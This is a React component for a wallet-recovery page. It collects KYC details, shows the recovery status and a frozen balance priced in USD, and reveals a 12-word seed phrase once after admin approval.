import React, { useCallback, useEffect, useState } from 'react';
import { authAPI, pricesAPI, walletAPI } from '../services/api';

const initialForm = {
  fullName: '',
  documentType: 'passport',
  documentNumber: '',
  documentFile: null
};

const statusCopy = {
  NO_KYC: {
    title: 'Identity verification required',
    body: 'To protect your assets, wallet recovery is only possible after completing identity verification.'
  },
  KYC_SUBMITTED: {
    title: 'Documents submitted',
    body: 'Your documents have been received and are pending review.'
  },
  KYC_PROCESSING: {
    title: 'Verifying identity',
    body: 'Verification is in progress. Please wait.'
  },
  KYC_MORE_DOCS: {
    title: 'Additional documents required',
    body: 'Please review the admin request and submit the requested documents.'
  },
  KYC_APPROVED: {
    title: 'Identity verified successfully',
    body: 'Your identity verification is approved.'
  },
  KYC_REJECTED: {
    title: 'Verification failed',
    body: 'Your verification was rejected. Please review the admin notes and resubmit.'
  },
  SEED_READY: {
    title: 'Recovery seed available',
    body: 'Your recovery seed has been securely prepared. You may reveal it once.'
  },
  SEED_REVEALED: {
    title: 'Seed already revealed',
    body: 'Your recovery seed has already been shown once and cannot be displayed again.'
  }
};

async function hashFile(file) {
  const buffer = await file.arrayBuffer();
  const digest = await crypto.subtle.digest('SHA-256', buffer);
  const hashArray = Array.from(new Uint8Array(digest));
  return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
}

function toNumber(value) {
  if (typeof value === 'number') return Number.isFinite(value) ? value : null;
  if (typeof value === 'string') {
    const parsed = Number.parseFloat(value);
    return Number.isFinite(parsed) ? parsed : null;
  }
  return null;
}

function RecoverWalletPage() {
  const [form, setForm] = useState(initialForm);
  const [status, setStatus] = useState('NO_KYC');
  const [message, setMessage] = useState('');
  const [walletExists, setWalletExists] = useState(false);
  const [recoveryBalance, setRecoveryBalance] = useState(null);
  const [livePrices, setLivePrices] = useState(null);
  const [loading, setLoading] = useState(false);
  const [submitMessage, setSubmitMessage] = useState('');
  const [revealLoading, setRevealLoading] = useState(false);
  const [seedPayload, setSeedPayload] = useState(null);

  const statusText = statusCopy[status] || statusCopy.NO_KYC;

  const canSubmitKyc = form.fullName && form.documentNumber && !loading;
  const showKycForm = status === 'NO_KYC' || status === 'KYC_MORE_DOCS' || status === 'KYC_REJECTED';
  const showSubmitted = status === 'KYC_SUBMITTED';
  const showProcessing = status === 'KYC_PROCESSING';
  const showApproved = status === 'KYC_APPROVED';
  const showRejected = status === 'KYC_REJECTED';
  const showSeedReady = status === 'SEED_READY';
  const showSeedRevealed = status === 'SEED_REVEALED';

  const loadStatus = useCallback(async () => {
    try {
      const response = await walletAPI.getRecoveryStatus();
      const statusValue = response.data?.status || 'NO_KYC';
      const walletReady = Boolean(response.data?.walletExists);
      setStatus(statusValue);
      setMessage(response.data?.message || '');
      setWalletExists(walletReady);

      if (walletReady) {
        const walletRes = await walletAPI.getRecoveryWallet();
        const wallet = walletRes.data;
        if (wallet?.address && wallet?.network) {
          const balanceRes = await walletAPI.getBalance(wallet.address, wallet.network);
          const amount = toNumber(
            balanceRes.data?.native?.balance
            ?? balanceRes.data?.balance
            ?? balanceRes.data?.totalBtc
          );
          const symbol = wallet.network === 'bitcoin' ? 'BTC' : wallet.network.toUpperCase();
          const rate = symbol === 'BTC'
            ? livePrices?.bitcoin?.usd
            : symbol === 'ETH'
              ? livePrices?.ethereum?.usd
              : symbol === 'USDT'
                ? livePrices?.tether?.usd
                : null;
          const usd = typeof rate === 'number' && typeof amount === 'number' ? amount * rate : null;
          setRecoveryBalance({ amount, symbol, usd });
        }
      } else {
        setRecoveryBalance(null);
      }
    } catch (error) {
      // 404 is expected when recovery wallet doesn't exist yet
      if (error?.response?.status !== 404) {
        console.error('Error loading recovery status:', error);
      }
      setStatus('NO_KYC');
      setWalletExists(false);
      setRecoveryBalance(null);
    }
  }, [livePrices]);

  const loadPrices = useCallback(async () => {
    try {
      const response = await pricesAPI.getLivePrices();
      setLivePrices(response.data);
    } catch (error) {
      setLivePrices(null);
    }
  }, []);

  useEffect(() => {
    const fetchNow = async () => {
      await loadPrices();
      await loadStatus();
    };

    fetchNow();

    const statusInterval = setInterval(loadStatus, 30000);
    const priceInterval = setInterval(loadPrices, 60000);

    return () => {
      clearInterval(statusInterval);
      clearInterval(priceInterval);
    };
  }, [loadPrices, loadStatus]);

  const onSubmitKyc = async (event) => {
    event.preventDefault();
    setLoading(true);
    setSubmitMessage('');

    try {
      // Ensure the CSRF cookie is fresh before submitting (handles sessions
      // that existed before the CSRF cookie was first issued)
      try { await authAPI.fetchCsrfToken(); } catch (_) { /* non-fatal */ }

      const documentHash = form.documentFile ? await hashFile(form.documentFile) : '';
      await walletAPI.submitKyc({
        fullName: form.fullName,
        documentType: form.documentType,
        documentNumber: form.documentNumber,
        documentHash
      });
      setSubmitMessage('KYC submitted. Your documents are under review.');
      setForm(initialForm);
      await loadStatus();
    } catch (error) {
      setSubmitMessage(error?.response?.data?.message || 'Unable to submit KYC.');
    } finally {
      setLoading(false);
    }
  };

  const onRevealSeed = async () => {
    setRevealLoading(true);
    setSeedPayload(null);

    try {
      const response = await walletAPI.getSeedOnce();
      setSeedPayload(response.data);
      await loadStatus();
    } catch (error) {
      setSubmitMessage(error?.response?.data?.message || 'Unable to reveal seed phrase.');
    } finally {
      setRevealLoading(false);
    }
  };

  const showSeedButton = showSeedReady || (showApproved && walletExists);

  return (
    <div className="rw-theme rw-page rw-recover">
      <div className="rw-recover-container">
        <div className="rw-recover-header">
          <h1>Recover Wallet</h1>
          <p className="rw-muted">KYC approval is required before recovery credentials are released.</p>
        </div>

        {showKycForm && (
          <div className="rw-recover-box">
            <p><strong>{statusText.title}</strong></p>
            <p>{statusText.body}</p>
            <form onSubmit={onSubmitKyc} className="rw-recover-form">
              <div className="form-group">
                <label className="form-label">Full name</label>
                <input
                  className="form-input"
                  type="text"
                  value={form.fullName}
                  onChange={(event) => setForm((prev) => ({ ...prev, fullName: event.target.value }))}
                />
              </div>
              <div className="form-group">
                <label className="form-label">Document type</label>
                <select
                  className="form-input form-select"
                  value={form.documentType}
                  onChange={(event) => setForm((prev) => ({ ...prev, documentType: event.target.value }))}
                >
                  <option value="passport">Passport</option>
                  <option value="id">National ID</option>
                  <option value="driver">Driver License</option>
                </select>
              </div>
              <div className="form-group">
                <label className="form-label">Document number</label>
                <input
                  className="form-input"
                  type="text"
                  value={form.documentNumber}
                  onChange={(event) => setForm((prev) => ({ ...prev, documentNumber: event.target.value }))}
                />
              </div>
              <div className="form-group">
                <label className="form-label">Document upload</label>
                <input
                  className="form-input"
                  type="file"
                  onChange={(event) => setForm((prev) => ({ ...prev, documentFile: event.target.files?.[0] || null }))}
                />
              </div>
              <button className="rw-btn rw-btn-primary" type="submit" disabled={!canSubmitKyc}>
                {loading ? 'Submitting...' : 'Start Identity Verification'}
              </button>
              {submitMessage && <div className="rw-admin-message">{submitMessage}</div>}
            </form>
          </div>
        )}

        {showSubmitted && (
          <div className="rw-recover-box">
            <p><strong>{statusText.title}</strong></p>
            <p>{statusText.body}</p>
          </div>
        )}

        {showProcessing && (
          <div className="rw-recover-loader">Verifying identity… please wait</div>
        )}

        {status === 'KYC_MORE_DOCS' && (
          <div className="rw-recover-warning">
            Additional documents required:<br /><br />
            <em>“{message || 'Please submit the requested documents.'}”</em>
          </div>
        )}

        {showRejected && (
          <div className="rw-recover-error">
            Verification failed. {message || 'Please upload another ID and resubmit.'}
          </div>
        )}

        {showApproved && (
          <div className="rw-recover-success">Identity verified successfully.</div>
        )}

        {showSeedButton && (
          <div className="rw-recover-box">
            <p><strong>Recovery seed available</strong></p>
            <p>Your recovery seed has been securely prepared. You may reveal it once.</p>
            {recoveryBalance && (
              <div className="rw-recover-frozen">
                Frozen balance: {typeof recoveryBalance.amount === 'number'
                  ? `${recoveryBalance.amount.toFixed(6)} ${recoveryBalance.symbol}`
                  : '—'}
                {typeof recoveryBalance.usd === 'number' && (
                  <span className="rw-recover-frozen-usd">({recoveryBalance.usd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })})</span>
                )}
              </div>
            )}
            <button className="rw-btn rw-btn-primary" onClick={onRevealSeed} disabled={revealLoading}>
              {revealLoading ? 'Decrypting...' : 'Reveal 12-Word Seed Phrase'}
            </button>
          </div>
        )}

        {revealLoading && (
          <div className="rw-recover-loader">
            <img src="/images/recovery-cyber.svg" alt="system processing" />
          </div>
        )}

        {showSeedRevealed && (
          <div className="rw-recover-error">
            Write this seed phrase down and never share it. It cannot be shown again.
          </div>
        )}

        {seedPayload && (
          <div className="rw-recover-seed">
            <div className="rw-recover-seed-box">{seedPayload.mnemonic}</div>
          </div>
        )}
      </div>
    </div>
  );
}

export default RecoverWalletPage;
